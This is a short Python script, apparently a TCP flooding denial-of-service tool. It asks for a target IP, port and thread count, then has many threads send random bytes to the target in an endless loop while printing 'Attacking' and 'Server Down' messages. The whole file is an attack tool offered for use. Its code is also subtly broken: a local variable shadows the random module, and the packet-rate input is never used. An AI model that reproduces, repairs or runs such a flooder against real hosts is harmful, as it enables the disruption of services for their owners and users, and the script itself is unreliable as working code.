import socket
import threading
import random

ip = input("Target : ")
port = int(input("PORT : "))
pack = int(input("Packet/s: "))
thread = int(input("threading : "))



def attack():
    cnt = int(0)
    random = random._urandom(10)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    while True:
        try:
            s.send(random)
            cnt += 1
        except:
            s.close()
            print("Server Down!!!!!")
            exit()
        finally:
            print(f"Attacking {ip}:{port} | Sent {cnt}")









for _ in range(thread):
    threading.Thread(target=attack).start()
